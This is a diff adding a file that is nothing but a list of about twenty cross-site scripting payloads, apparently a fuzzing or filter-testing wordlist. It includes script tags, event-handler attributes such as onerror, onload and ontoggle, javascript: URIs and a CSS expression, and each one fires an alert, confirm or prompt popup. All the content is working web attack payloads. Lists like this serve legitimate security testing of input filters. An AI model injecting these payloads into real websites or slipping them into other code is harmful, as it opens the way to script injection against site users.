@@ -1,0 +1,20 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<math><mi//xlink:href='javascript:alert(1)'>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<a href=javascript:alert(1)>click</a>
+<video><source onerror=alert(1)>
+<object data=javascript:alert(1)>
+<div style="animation-name:x" onanimationstart="alert(1)"></div>
+<p style="width: expression(alert(1));">
+<img src='x' onerror='confirm(1)'>
+<script>confirm(document.domain)</script>
+<script>prompt('XSS')</script>
+<marquee onstart=alert(1)>
+<img src=x onerror=alert('XSS')>
